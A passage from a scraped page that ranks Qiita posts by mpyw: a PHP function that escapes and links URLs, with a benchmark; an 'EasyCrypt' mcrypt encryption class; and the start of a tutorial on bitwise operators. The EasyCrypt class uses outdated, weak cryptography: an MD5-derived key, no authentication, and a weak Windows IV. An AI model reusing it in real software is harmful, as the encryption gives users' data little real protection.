        <span class="s1">'2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\\'</span> <span class="o">.</span>
        <span class="s1">'d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])'</span> <span class="o">.</span>
        <span class="s1">')|(?:[0-9a-f]{1,4})?+::(?:[0-9a-f]{1,4}:){4}(?:[0-'</span> <span class="o">.</span>
        <span class="s1">'9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2[0-'</span> <span class="o">.</span>
        <span class="s1">'4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-'</span> <span class="o">.</span>
        <span class="s1">'5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d'</span> <span class="o">.</span>
        <span class="s1">'|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:[0-9a-f]{'</span> <span class="o">.</span>
        <span class="s1">'1,4}:)?+[0-9a-f]{1,4})?+::(?:[0-9a-f]{1,4}:){3}(?:'</span> <span class="o">.</span>
        <span class="s1">'[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2'</span> <span class="o">.</span>
        <span class="s1">'[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25'</span> <span class="o">.</span>
        <span class="s1">'[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?'</span> <span class="o">.</span>
        <span class="s1">':\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:[0-9a-'</span> <span class="o">.</span>
        <span class="s1">'f]{1,4}:){0,2}[0-9a-f]{1,4})?+::(?:[0-9a-f]{1,4}:)'</span> <span class="o">.</span>
        <span class="s1">'{2}(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\\'</span> <span class="o">.</span>
        <span class="s1">'d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4'</span> <span class="o">.</span>
        <span class="s1">']\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5'</span> <span class="o">.</span>
        <span class="s1">'])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:'</span> <span class="o">.</span>
        <span class="s1">'[0-9a-f]{1,4}:){0,3}[0-9a-f]{1,4})?+::[0-9a-f]{1,4'</span> <span class="o">.</span>
        <span class="s1">'}:(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d'</span> <span class="o">.</span>
        <span class="s1">'{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]'</span> <span class="o">.</span>
        <span class="s1">'\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]'</span> <span class="o">.</span>
        <span class="s1">')\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:['</span> <span class="o">.</span>
        <span class="s1">'0-9a-f]{1,4}:){0,4}[0-9a-f]{1,4})?+::(?:[0-9a-f]{1'</span> <span class="o">.</span>
        <span class="s1">',4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25'</span> <span class="o">.</span>
        <span class="s1">'[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?'</span> <span class="o">.</span>
        <span class="s1">':\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\\'</span> <span class="o">.</span>
        <span class="s1">'d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:[0-9a-f]{1,4}:){'</span> <span class="o">.</span>
        <span class="s1">'0,5}[0-9a-f]{1,4})?+::[0-9a-f]{1,4}|(?:(?:[0-9a-f]'</span> <span class="o">.</span>
        <span class="s1">'{1,4}:){0,6}[0-9a-f]{1,4})?+::|v[0-9a-f]++\.[!$&amp;-.'</span> <span class="o">.</span>
        <span class="s1">'0-;=_a-z~]++)\]|(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0'</span> <span class="o">.</span>
        <span class="s1">'-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\\'</span> <span class="o">.</span>
        <span class="s1">'d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|'</span> <span class="o">.</span>
        <span class="s1">'1\d{2}|2[0-4]\d|25[0-5])|(?:[-.0-9_a-z~]|%[0-9a-f]'</span> <span class="o">.</span>
        <span class="s1">'[0-9a-f]|[!$&amp;-,;=])*+)(?::\d*+)?+(?:/(?:[-.0-9_a-z'</span> <span class="o">.</span>
        <span class="s1">'~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])*+)*+|/(?:(?:[-.0'</span> <span class="o">.</span>
        <span class="s1">'-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])++(?:/(?:[-'</span> <span class="o">.</span>
        <span class="s1">'.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])*+)*+)?+|'</span> <span class="o">.</span>
        <span class="s1">'(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])++(?'</span> <span class="o">.</span>
        <span class="s1">':/(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])*+'</span> <span class="o">.</span>
        <span class="s1">')*+)?+(?:\?+(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;'</span> <span class="o">.</span>
        <span class="s1">'-,/:;=?+@])*+)?+(?:#(?:[-.0-9_a-z~]|%[0-9a-f][0-9a'</span> <span class="o">.</span>
        <span class="s1">'-f]|[!$&amp;-,/:;=?+@])*+)?+)|(?:&amp;gt;){2}(\d++)`i'</span>
    <span class="p">;</span>
    <span class="nv">$callback</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$m</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">?</span>
            <span class="nb">sprintf</span><span class="p">(</span><span class="s1">'&lt;a href="bbs.php?id=%s"&gt;%s&lt;/a&gt;'</span><span class="p">,</span> <span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$m</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">:</span>
            <span class="nb">sprintf</span><span class="p">(</span><span class="s1">'&lt;a href="%1$s" target="_blank"&gt;%1$s&lt;/a&gt;'</span><span class="p">,</span> <span class="nv">$m</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="p">;</span>
    <span class="p">};</span>
    <span class="nv">$str</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
    <span class="k">return</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="nv">$regex</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
<span class="p">}</span>

<span class="nv">$str</span> <span class="o">=</span> <span class="s1">'&gt;&gt;10 Qiitaって何じゃねーよggrks https://www.google.co.jp/search?q=qiita'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nx">escape_and_linkify</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
</pre></div></div>

<p>こうなります。</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"bbs.php?id=10"</span><span class="p">&gt;</span><span class="ni">&amp;gt;&amp;gt;</span>10<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span> Qiitaって何じゃねーよggrks <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"https://www.google.co.jp/search?q=qiita"</span> <span class="na">target</span><span class="o">=</span><span class="s">"_blank"</span><span class="p">&gt;</span>https://www.google.co.jp/search?q=qiita<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</pre></div></div>

<h1>
<span id="この処理重いんじゃないの" class="fragment"></span><a href="#%E3%81%93%E3%81%AE%E5%87%A6%E7%90%86%E9%87%8D%E3%81%84%E3%82%93%E3%81%98%E3%82%83%E3%81%AA%E3%81%84%E3%81%AE"><i class="fa fa-link"></i></a>この処理重いんじゃないの？？？？</h1>

<p>と言われたのでベンチマークとってみました。</p>

<h4>
<span id="テスト環境" class="fragment"></span><a href="#%E3%83%86%E3%82%B9%E3%83%88%E7%92%B0%E5%A2%83"><i class="fa fa-link"></i></a>テスト環境</h4>

<table>
<thead>
<tr>
<th style="text-align: left">CPU</th>
<th style="text-align: left">Intel Core i7-2600K 3.40GHz</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">OS</td>
<td style="text-align: left">Windows 7 Ultimate 64bit</td>
</tr>
<tr>
<td style="text-align: left">RAM</td>
<td style="text-align: left">16GB</td>
</tr>
<tr>
<td style="text-align: left">PHP</td>
<td style="text-align: left">PHP 5.4.16</td>
</tr>
<tr>
<td style="text-align: left">Server</td>
<td style="text-align: left">Apache 2.4.4</td>
</tr>
</tbody>
</table>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$time</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
<span class="nv">$max</span> <span class="o">=</span> <span class="mi">999999</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$max</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$t1</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
    <span class="nv">$tmp</span> <span class="o">=</span> <span class="nx">escape_and_linkify</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
    <span class="nv">$t2</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
    <span class="nv">$time</span> <span class="o">+=</span> <span class="nv">$t2</span> <span class="o">-</span> <span class="nv">$t1</span><span class="p">;</span>
    <span class="nb">unset</span><span class="p">(</span><span class="nv">$t1</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">,</span> <span class="nv">$t2</span><span class="p">);</span>
<span class="p">}</span>
<span class="nb">printf</span><span class="p">(</span><span class="s1">'%d回%f秒(平均%f秒)'</span><span class="p">,</span>
    <span class="nv">$max</span><span class="p">,</span>
    <span class="nv">$time</span><span class="p">,</span>
    <span class="nv">$time</span> <span class="o">/</span> <span class="nv">$max</span>
<span class="p">);</span>
</pre></div></div>

<p>結果は・・・</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>999999回26.648554秒(平均0.000027秒)
</pre></div></div>

<p>まぁ許容範囲でしょこれは！（動作速度気にするんだったら正規表現文字列とクロージャを <code>static</code> で書くようにするともうちょっと速くなるかも）</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />24位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>54</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/7a54efc02cb5e144b00e">PHPで復号化可能な暗号化を簡単に行えるクラス</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-08-29 19:54:19</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>PHPに組み込まれている <strong>Mcrypt</strong> 関数群を使えば出来るのですが、そのままだとかなり面倒なのでクラス作ってみました。<br>
初期化ベクトルは乱数から生成しているので、暗号化された文字列は同じデータ・同じソルトを用いたとしても毎回異なります。</p>

<ins>バージョン2.0.1での変更点</ins>

<ul>
<li>空文字列を暗号化しようとしたときに<code>FALSE</code>を返してエラーを防ぐように修正しました。</li>
</ul>

<ins>バージョン2.0.0での変更点</ins>

<ul>
<li>間違った暗号化データを渡したときに発生するエラーが出ないように修正しました。</li>
<li>復号化に失敗したときに<code>FALSE</code>を返すようにしました。<br>
(<code>FALSE</code>でなければ復号化されたものが正しいデータであるとは限りません)</li>
<li>暗号化の際、末尾の<code>=</code>を削除してもBASE64エンコードには問題ないので見た目な観点から削除してみました（笑</li>
<li>過去のバージョンと互換性はありません。</li>
</ul>

<h2>
<span id="easycrypt-クラス" class="fragment"></span><a href="#easycrypt-%E3%82%AF%E3%83%A9%E3%82%B9"><i class="fa fa-link"></i></a><code>EasyCrypt</code> クラス</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="sd">/**</span>
<span class="sd"> * EasyCrypt</span>
<span class="sd"> *</span>
<span class="sd"> * A class that provides you simple interface for decryptable encryption.</span>
<span class="sd"> * Requires PHP 5.0.0 or later.</span>
<span class="sd"> * </span>
<span class="sd"> * @Version 2.0.1</span>
<span class="sd"> * @Author  CertaiN</span>
<span class="sd"> * @License CC0 (No rights reserved)</span>
<span class="sd"> * @GitHub  http://github.com/certainist/EasyCrypt</span>
<span class="sd"> */</span>
<span class="k">class</span> <span class="nc">EasyCrypt</span> <span class="p">{</span>

   <span class="sd">/**</span>
<span class="sd">    * @access   private</span>
<span class="sd">    * @property</span>
<span class="sd">    */</span>
    <span class="k">private</span> <span class="nv">$key</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$mc</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$iv_size</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$init</span><span class="p">;</span>

   <span class="sd">/**</span>
<span class="sd">    * For encrypting.</span>
<span class="sd">    * </span>
<span class="sd">    * @access public</span>
<span class="sd">    * @static</span>
<span class="sd">    * @param  string $data Raw data.</span>
<span class="sd">    * @param  string $salt Secret key.</span>
<span class="sd">    * @return mixed  Encrypted data or FALSE on empty string.</span>
<span class="sd">    */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$salt</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$data</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">self</span><span class="p">(</span><span class="nv">$salt</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">_encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="p">}</span>

   <span class="sd">/**</span>
<span class="sd">    * For decrypting.</span>
<span class="sd">    *</span>
<span class="sd">    * @access public</span>
<span class="sd">    * @static</span>
<span class="sd">    * @param  string $data Encrypted data.</span>
<span class="sd">    * @param  string $salt Secret key.</span>
<span class="sd">    * @return mixed  Decrypted data or FALSE.</span>
<span class="sd">    */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$salt</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">self</span><span class="p">(</span><span class="nv">$salt</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">_decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$salt</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mc</span> <span class="o">=</span> <span class="nb">mcrypt_module_open</span><span class="p">(</span><span class="s1">'rijndael-256'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="s1">'cbc'</span><span class="p">,</span> <span class="s1">''</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$salt</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">mcrypt_enc_get_key_size</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mc</span><span class="p">));</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">iv_size</span> <span class="o">=</span> <span class="nb">mcrypt_enc_get_iv_size</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mc</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">mcrypt_generic_deinit</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mc</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nb">mcrypt_module_close</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mc</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">_encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">PHP_OS</span> <span class="o">===</span> <span class="s1">'WIN32'</span> <span class="o">||</span> <span class="k">PHP_OS</span> <span class="o">===</span> <span class="s1">'WINNT'</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">srand</span><span class="p">();</span>
            <span class="nv">$iv</span> <span class="o">=</span> <span class="nb">mcrypt_create_iv</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">iv_size</span><span class="p">,</span> <span class="nx">MCRYPT_RAND</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$iv</span> <span class="o">=</span> <span class="nb">mcrypt_create_iv</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">iv_size</span><span class="p">,</span> <span class="nx">MCRYPT_DEV_URANDOM</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nb">mcrypt_generic_init</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mc</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">mcrypt_generic</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mc</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">));</span>
        <span class="k">return</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$iv</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'-'</span> <span class="o">.</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">)),</span> <span class="s1">'='</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">_decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">list</span><span class="p">(</span><span class="nv">$iv</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="o">=</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">'base64_decode'</span><span class="p">,</span>
            <span class="nb">explode</span><span class="p">(</span>
                <span class="s1">'-'</span><span class="p">,</span>
                <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="k">true</span><span class="p">),</span>
                <span class="mi">2</span>
            <span class="p">)</span> 
            <span class="o">+</span> <span class="k">array</span><span class="p">(</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">)</span>
        <span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span> <span class="o">===</span> <span class="s1">''</span> <span class="o">||</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$iv</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">iv_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nb">mcrypt_generic_init</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mc</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="k">return</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">rtrim</span><span class="p">(</span><span class="nb">mdecrypt_generic</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mc</span><span class="p">,</span> <span class="nv">$data</span><span class="p">),</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span><span class="p">),</span> <span class="k">true</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div></div>

<p>一応GitHubにライセンスCC0で置いてます。<br>
<a href="https://github.com/Certainist/EasyCrypt" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/Certainist/EasyCrypt</a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />25位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>53</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/ce626976ec4dc07dfec2">【PHP入門講座】 ビット演算</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-12-01 12:37:23</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-c6b06fec38d8cc8e4fe4">目次に戻る</a>
</h3>

<p>ビット演算は、PHPを扱う上に置いてはそれほど重要性は高くないのですが、次の「演算子」の説明で必要性が生じてくるので、ここであらかじめ触れておきます。</p>

<h1>
<span id="ビット演算の概要" class="fragment"></span><a href="#%E3%83%93%E3%83%83%E3%83%88%E6%BC%94%E7%AE%97%E3%81%AE%E6%A6%82%E8%A6%81"><i class="fa fa-link"></i></a>ビット演算の概要</h1>

<h2>
<span id="導入" class="fragment"></span><a href="#%E5%B0%8E%E5%85%A5"><i class="fa fa-link"></i></a>導入</h2>

<p>2進数演算を考えましょう。</p>

<h3>
<span id="例-3--5--8" class="fragment"></span><a href="#%E4%BE%8B-3--5--8"><i class="fa fa-link"></i></a>【例】 $3 + 5 = 8$</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">10進数での表記</span></div>
<div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$a</span> <span class="o">+</span> <span class="nv">$b</span><span class="p">;</span>
</pre></div>
</div>

<p>整数を2進数で表記するためには <code>0b</code> を頭につける、と既に説明済みですが、結局<ins>データとしては10進数として扱われてしまう</ins>ので、2進数として出力したい場合には <code>decbin</code> <code>base_convert</code> <code>sprintf</code> などの関数を使って2進数表記の<ins>文字列</ins>に変換する必要があります。ここでは一番シンプルな <code>decbin</code> 関数を利用します。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">2進数での表記(PHP5.4以降のみ)</span></div>
<div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">b11</span><span class="p">;</span>            <span class="c1">//  011 (3)</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">b101</span><span class="p">;</span>           <span class="c1">// +101 (5)</span>
                      <span class="c1">// --------</span>
<span class="k">echo</span> <span class="nb">decbin</span><span class="p">(</span><span class="nv">$a</span> <span class="o">+</span> <span class="nv">$b</span><span class="p">);</span> <span class="c1">// 1000 (8)</span>
</pre></div>
</div>

<p>2進数は<ins>2で繰り上がる</ins>ので、上記のような結果が得られます。さあ、ここから2進数の各桁に注目してみましょう。なお、負の数の扱いは少し複雑なので、ここでは正の数だけを扱うことにします。</p>

<h2>
<span id="ビット積-" class="fragment"></span><a href="#%E3%83%93%E3%83%83%E3%83%88%E7%A9%8D-"><i class="fa fa-link"></i></a>ビット積 <code>&amp;</code>
</h2>

<ul>
<li>どちらも <code>1</code> ならば <code>1</code>
</li>
<li>どちらかが <code>0</code> ならば <code>0</code>
</li>
</ul>

<h3>
<span id="例-3-mbox-5--1" class="fragment"></span><a href="#%E4%BE%8B-3-mbox-5--1"><i class="fa fa-link"></i></a>【例】 $3 \mbox{&amp;} 5 = 1$</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">b11</span><span class="p">;</span>            <span class="c1">//  011 (3)</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">b101</span><span class="p">;</span>           <span class="c1">// &amp;101 (5)</span>
                      <span class="c1">// --------</span>
<span class="k">echo</span> <span class="nb">decbin</span><span class="p">(</span><span class="nv">$a</span> <span class="o">&amp;</span> <span class="nv">$b</span><span class="p">);</span> <span class="c1">//  001 (1)</span>
</pre></div></div>

<h2>
<span id="ビット和-" class="fragment"></span><a href="#%E3%83%93%E3%83%83%E3%83%88%E5%92%8C-"><i class="fa fa-link"></i></a>ビット和 <code>|</code>
</h2>

<ul>
<li>どちらかが <code>1</code> ならば <code>1</code>
</li>
<li>どちらも <code>0</code> ならば <code>0</code>
</li>
</ul>

<h3>
<span id="例-3-mbox-5--7" class="fragment"></span><a href="#%E4%BE%8B-3-mbox-5--7"><i class="fa fa-link"></i></a>【例】 $3 \mbox{|} 5 = 7$</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">b11</span><span class="p">;</span>            <span class="c1">//  011 (3)</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">b101</span><span class="p">;</span>           <span class="c1">// |101 (5)</span>
                      <span class="c1">// --------</span>
<span class="k">echo</span> <span class="nb">decbin</span><span class="p">(</span><span class="nv">$a</span> <span class="o">|</span> <span class="nv">$b</span><span class="p">);</span> <span class="c1">//  111 (7)</span>
</pre></div></div>

<h2>
<span id="排他的論理和-" class="fragment"></span><a href="#%E6%8E%92%E4%BB%96%E7%9A%84%E8%AB%96%E7%90%86%E5%92%8C-"><i class="fa fa-link"></i></a>排他的論理和 <code>^</code>
</h2>

<ul>
<li>どちらか<ins>一方のみ</ins>が <code>1</code> ならば <code>1</code>
</li>
<li>どちらも <code>0</code> ならば <code>0</code>
</li>
<li>どちらも <code>1</code> ならば <code>0</code>
</li>
</ul>

<h3>
<span id="例-3-mbox-5--6" class="fragment"></span><a href="#%E4%BE%8B-3-mbox-5--6"><i class="fa fa-link"></i></a>【例】 $3 \mbox{^} 5 = 6$</h3>

